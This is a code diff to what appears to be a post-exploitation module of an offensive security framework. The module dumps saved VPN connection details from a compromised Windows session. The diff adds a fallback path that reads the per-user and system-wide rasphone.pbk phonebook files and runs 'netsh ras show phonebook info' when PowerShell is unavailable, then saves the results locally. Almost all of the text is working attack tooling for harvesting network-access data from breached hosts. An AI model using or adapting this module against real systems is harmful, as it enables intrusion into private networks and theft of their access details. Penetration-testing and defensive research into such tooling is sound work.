@@ -6,6 +6,7 @@ Extract saved VPN connection details from a Windows session.
 """
 
 from kittysploit import *
+from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
 import base64
 import os
 import re
@@ -88,6 +89,12 @@ class Module(Post):
     }
 
     save_local = OptBool(True, "Save results under ./output", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell when available (default: type/netsh via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -150,11 +157,30 @@ if (-not $found) {
 """
 
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
         return True
+
+    def _extract_via_cmd(self) -> str:
+        sections = []
+        found = False
+        pbk_paths = (
+            r"%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk",
+            r"%ProgramData%\Microsoft\Network\Connections\Pbk\rasphone.pbk",
+        )
+        for path in pbk_paths:
+            exists = self._execute_cmd(f'if exist "{path}" (echo EXISTS) else (echo MISSING)')
+            if exists and "EXISTS" in exists:
+                found = True
+                content = self._execute_cmd(f'type "{path}"')
+                sections.append(f"=== Phonebook: {path} ===\n{content or '(empty)'}")
+
+        ras = self._execute_cmd("netsh ras show phonebook info")
+        if ras and not re.search(r"not recognized|The following command was not found", ras, re.I):
+            found = True
+            sections.append(f"=== netsh ras show phonebook info ===\n{ras}")
+
+        if not found:
+            return "No VPN profiles or phonebook files found."
+        return "\n\n".join(sections)
 
     def _save_output(self, content: str) -> str:
         os.makedirs(_LOCAL_OUT, exist_ok=True)
@@ -166,10 +192,17 @@ if (-not $found) {
 
     def run(self):
         if not self.check():
-            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")
+            raise ProcedureError(win_compat_failure_type(), "VPN dump prerequisites not met")
 
         print_status("Collecting VPN profiles...")
-        result = self._run_powershell(self._powershell_script())
+        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
+        if use_ps:
+            print_info("Using PowerShell")
+            result = self._run_powershell(self._powershell_script())
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — falling back to type/netsh")
+            result = self._extract_via_cmd()
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
